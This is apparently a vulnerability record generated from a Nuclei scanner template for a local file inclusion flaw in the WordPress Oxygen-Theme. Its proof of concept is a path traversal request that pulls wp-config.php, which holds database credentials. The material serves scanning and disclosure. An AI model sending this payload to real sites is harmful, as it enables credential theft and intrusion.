# Nuclei Template: WordPress Oxygen-Theme - Local File Inclusion
**Template ID:** wp-oxygen-theme-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`wp-oxygen-theme-lfi.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Oxygen-Theme has a local file inclusion vulnerability via the 'file' parameter of 'download.php'.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/themes/oxygen-theme/download.php?file=../../../wp-config.php
```

## References
- https://cxsecurity.com/issue/WLB-2019030178
